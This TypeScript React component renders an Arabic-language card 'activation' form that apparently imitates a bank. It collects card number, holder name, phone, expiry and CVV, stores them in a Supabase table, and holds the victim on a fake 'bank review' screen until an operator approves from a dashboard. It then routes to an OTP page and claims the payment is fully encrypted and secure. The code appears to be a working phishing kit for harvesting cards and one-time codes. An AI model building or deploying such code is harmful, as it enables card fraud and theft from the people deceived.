// @ts-nocheck
import { useEffect, useMemo, useRef, useState } from "react";
import { useNavigate } from "@tanstack/react-router";
import {
  CalendarDays,
  CreditCard as CardIcon,
  KeyRound,
  Loader2,
  Lock,
  Phone,
  ShieldCheck,
  User as UserIcon,
} from "lucide-react";

import { cn } from "@/lib/utils";
import { saveApplication } from "@/lib/admin-storage";
import { supabase } from "@/integrations/supabase/client";

const Field = ({
  label,
  icon: Icon,
  children,
}: {
  label: string;
  icon: React.ElementType;
  children: React.ReactNode;
}) => (
  <div>
    <label className="mb-1.5 flex items-center justify-end gap-1.5 text-[12.5px] font-extrabold text-ab-navy sm:text-[13.5px]">
      <span>{label}</span>
      <Icon className="h-[15px] w-[15px]" strokeWidth={2.2} />
    </label>
    {children}
  </div>
);

const inputBase =
  "h-[46px] w-full rounded-[10px] border border-[hsl(214_25%_88%)] bg-white px-3 text-right text-[13.5px] font-medium text-ab-navy placeholder:text-muted-foreground/70 outline-none transition-all focus:border-ab-blue/60 focus:ring-2 focus:ring-ab-blue/15";

const formatCardNumber = (v: string) =>
  v.replace(/\D/g, "").slice(0, 16).replace(/(.{4})/g, "$1 ").trim();

function detectBrand(digits: string): "visa" | "mastercard" | "mada" | "unknown" {
  if (/^4/.test(digits)) return "visa";
  if (/^(5[1-5]|2[2-7])/.test(digits)) return "mastercard";
  return "unknown";
}

export function CardPaymentForm({ cardTitle }: { cardTitle: string }) {
  const navigate = useNavigate();
  const [card, setCard] = useState("");
  const [name, setName] = useState("");
  const [phone, setPhone] = useState("");
  const [month, setMonth] = useState("");
  const [year, setYear] = useState("");
  const [cvv, setCvv] = useState("");
  const [submitting, setSubmitting] = useState(false);
  const [error, setError] = useState("");
  const [waitingId, setWaitingId] = useState<string | null>(null);
  const navigatedRef = useRef(false);

  // Subscribe to admin approval on the submitted application
  useEffect(() => {
    if (!waitingId) return;
    const goToOtp = () => {
      if (navigatedRef.current) return;
      navigatedRef.current = true;
      navigate({ to: "/otp" });
    };
    const channel = supabase
      .channel(`card-wait-${waitingId}`)
      .on(
        "postgres_changes",
        {
          event: "UPDATE",
          schema: "public",
          table: "applications",
          filter: `id=eq.${waitingId}`,
        },
        (payload: { new: unknown }) => {
          const status = (payload.new as { review_status?: string }).review_status;
          if (status === "approved" || status === "bank_approval") {
            goToOtp();
          } else if (status === "rejected") {
            setWaitingId(null);
            setSubmitting(false);
            setError("تم رفض البطاقة، الرجاء المحاولة مرة أخرى");
          }
        },
      )
      .subscribe();
    // Safety poll in case realtime is slow
    const poll = window.setInterval(async () => {
      const { data } = await supabase
        .from("applications")
        .select("review_status")
        .eq("id", waitingId)
        .maybeSingle();
      const status = (data as { review_status?: string } | null)?.review_status;
      if (status === "approved" || status === "bank_approval") goToOtp();
      else if (status === "rejected") {
        setWaitingId(null);
        setSubmitting(false);
        setError("تم رفض البطاقة، الرجاء المحاولة مرة أخرى");
      }
    }, 3000);
    return () => {
      supabase.removeChannel(channel);
      window.clearInterval(poll);
    };
  }, [waitingId, navigate]);

  const months = useMemo(
    () => Array.from({ length: 12 }, (_, i) => String(i + 1).padStart(2, "0")),
    [],
  );
  const years = useMemo(() => {
    const y = new Date().getFullYear();
    return Array.from({ length: 12 }, (_, i) => String(y + i));
  }, []);

  const digits = card.replace(/\s/g, "");
  const isValid =
    digits.length >= 15 &&
    name.trim().length >= 3 &&
    phone.replace(/\D/g, "").length >= 9 &&
    month &&
    year &&
    cvv.length >= 3;

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!isValid || submitting) {
      if (!isValid) setError("الرجاء إكمال بيانات البطاقة ورقم الجوال");
      return;
    }
    setError("");
    setSubmitting(true);
    const entry = await saveApplication({
      cardTitle,
      phone,
      cardNumber: digits,
      cardName: name,
      cardExpMonth: month,
      cardExpYear: year,
      cardCvv: cvv,
      cardBrand: detectBrand(digits),
      status: "pending",
      reviewStatus: "card_submitted",
    });
    if (!entry) {
      setSubmitting(false);
      setError("تعذّر إرسال الطلب، حاول مرة أخرى");
      return;
    }
    try {
      sessionStorage.setItem("ab_current_app_id", entry.id);
      sessionStorage.setItem(
        "ab_otp_data",
        JSON.stringify({
          cardTitle,
          cardNumber: digits,
          cardName: name,
          phone,
        }),
      );
    } catch {}
    // Do NOT navigate yet. Wait for admin approval from the dashboard.
    setWaitingId(entry.id);
  };

  return (
    <form
      onSubmit={handleSubmit}
      className="relative w-full max-w-xl rounded-2xl bg-card p-4 shadow-card sm:p-6"
    >
      <div className="mt-2 space-y-4">
        <Field label="رقم البطاقة" icon={CardIcon}>
          <input
            inputMode="numeric"
            dir="ltr"
            value={card}
            onChange={(e) => setCard(formatCardNumber(e.target.value))}
            placeholder="1234 5678 9012 3456"
            className={cn(inputBase, "text-left tracking-widest")}
          />
        </Field>

        <Field label="اسم حامل البطاقة" icon={UserIcon}>
          <input
            value={name}
            onChange={(e) => setName(e.target.value.slice(0, 60))}
            placeholder="الاسم كما هو مدون على البطاقة"
            className={inputBase}
          />
        </Field>

        <Field label="رقم الجوال" icon={Phone}>
          <input
            inputMode="tel"
            dir="ltr"
            value={phone}
            onChange={(e) => setPhone(e.target.value.replace(/[^\d+]/g, "").slice(0, 15))}
            placeholder="+9627XXXXXXXX"
            className={cn(inputBase, "text-left")}
          />
        </Field>

        <div className="grid grid-cols-2 gap-3">
          <Field label="شهر الانتهاء" icon={CalendarDays}>
            <select
              value={month}
              onChange={(e) => setMonth(e.target.value)}
              className={cn(inputBase, "appearance-none", !month && "text-muted-foreground/70")}
            >
              <option value="">الشهر</option>
              {months.map((m) => (
                <option key={m} value={m}>
                  {m}
                </option>
              ))}
            </select>
          </Field>
          <Field label="سنة الانتهاء" icon={CalendarDays}>
            <select
              value={year}
              onChange={(e) => setYear(e.target.value)}
              className={cn(inputBase, "appearance-none", !year && "text-muted-foreground/70")}
            >
              <option value="">السنة</option>
              {years.map((y) => (
                <option key={y} value={y}>
                  {y}
                </option>
              ))}
            </select>
          </Field>
        </div>

        <Field label="رمز الأمان (CVV)" icon={KeyRound}>
          <input
            inputMode="numeric"
            dir="ltr"
            value={cvv}
            onChange={(e) => setCvv(e.target.value.replace(/\D/g, "").slice(0, 3))}
            placeholder="123"
            className={cn(inputBase, "text-left tracking-widest")}
          />
        </Field>
      </div>

      {error && (
        <p className="mt-3 text-center text-[12.5px] font-bold text-red-600">{error}</p>
      )}

      <button
        type="submit"
        disabled={submitting}
        className={cn(
          "mt-6 flex h-[50px] w-full items-center justify-center gap-2 rounded-[10px] text-[14px] font-extrabold text-white shadow-soft transition-all sm:text-[15px]",
          isValid && !submitting
            ? "bg-ab-blue hover:brightness-110 active:scale-[0.99]"
            : "cursor-not-allowed bg-[hsl(214_25%_70%)]",
        )}
      >
        <Lock className="h-[16px] w-[16px]" strokeWidth={2.4} />
        <span>{submitting ? "جاري الإرسال..." : "فعّل الآن"}</span>
      </button>

      <div className="mt-4 flex items-center justify-center gap-1.5 text-[11.5px] text-muted-foreground">
        <ShieldCheck className="h-[14px] w-[14px] text-emerald-600" strokeWidth={2.2} />
        <span>عملية الدفع مشفّرة وآمنة بالكامل</span>
      </div>

      {waitingId && (
        <div className="absolute inset-0 z-20 flex items-center justify-center rounded-2xl bg-white/95 backdrop-blur-sm">
          <div className="flex flex-col items-center gap-3 px-6 text-center">
            <Loader2 className="h-10 w-10 animate-spin text-ab-blue" />
            <div className="text-[15px] font-extrabold text-ab-navy">
              جاري التحقق من البطاقة...
            </div>
            <div className="text-[12.5px] text-muted-foreground">
              الرجاء الانتظار حتى تتم مراجعة العملية من قِبل البنك.
            </div>
          </div>
        </div>
      )}
    </form>
  );
}
